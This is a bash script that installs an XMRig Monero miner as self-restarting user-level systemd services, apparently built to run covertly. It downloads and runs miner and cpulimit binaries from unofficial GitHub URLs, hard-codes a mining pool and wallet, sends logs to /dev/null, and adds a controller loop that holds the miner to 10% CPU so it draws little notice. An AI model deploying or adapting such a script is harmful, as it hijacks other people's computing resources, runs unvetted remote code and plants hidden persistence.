#!/bin/bash

SERVICE_DIR="$HOME/services"
XMRIG_DIR="$SERVICE_DIR/xmrig"
POOL="gulf.moneroocean.stream:10128"
WALLET="48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rRZd7vVXjRTnWEBBE33BC2sdw9k"

echo "=== RESTORING ORIGINAL SETUP + PERMANENT CONTROLLER ==="

# 1. CLEANUP
echo "[1/6] Cleaning..."
rm -rf "$XMRIG_DIR" 2>/dev/null
rm ~/.config/systemd/user/xmrig.service 2>/dev/null
rm ~/.config/systemd/user/xmrig-controller.service 2>/dev/null
systemctl --user daemon-reload 2>/dev/null

# 2. DOWNLOAD CPU CONTROLLER (No sudo needed)
echo "[2/6] Downloading Controller..."
mkdir -p "$HOME/bin"
wget -q -O "$HOME/bin/cpulimit" https://github.com/opsnull/cpulimit/releases/download/v2.9/cpulimit-x86_64
chmod +x "$HOME/bin/cpulimit"

# 3. CREATE MINER DIRECTORY
echo "[3/6] Setup Miner..."
mkdir -p "$XMRIG_DIR"
cd "$XMRIG_DIR"

# 4. DOWNLOAD XMRIG
echo "[4/6] Downloading Miner..."
wget -q https://raw.githubusercontent.com/followtheyellowbrickroad321/linux-miner/main/xmrig
chmod +x xmrig

# 5. CREATE MINER SERVICE (Standard)
echo "[5/6] Configuring Miner Service..."
mkdir -p ~/.config/systemd/user

cat > ~/.config/systemd/user/xmrig.service <<EOF
[Unit]
Description=XMRig Crypto Miner
After=network.target

[Service]
ExecStart=$XMRIG_DIR/xmrig --url=$POOL --user=$WALLET --cpu=1 --donate-level=1 --nicehash=false --daemon=false --no-color --log-file=/dev/null --bg --cpu-affinity=0
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

# 6. CREATE CONTROLLER SERVICE (The Loop)
# This runs the exact logic from your original script, but as a background service
echo "[6/6] Configuring Controller Service..."
mkdir -p ~/.config/systemd/user

cat > ~/.config/systemd/user/xmrig-controller.service <<'EOF'
[Unit]
Description=XMRig Loop Controller
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do sleep 5; MINER_PID=$(pgrep xmrig); if [ -n "$MINER_PID" ]; then cpulimit -p $MINER_PID -l 10; fi; done'
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
EOF

# 7. ACTIVATE
echo "=== ACTIVATING ==="
systemctl --user daemon-reload
systemctl --user enable xmrig.service
systemctl --user enable xmrig-controller.service
systemctl --user start xmrig.service
systemctl --user start xmrig-controller.service

echo "=== DONE ==="
echo "Miner Status: systemctl --user status xmrig"
echo "Controller Status: systemctl --user status xmrig-controller"
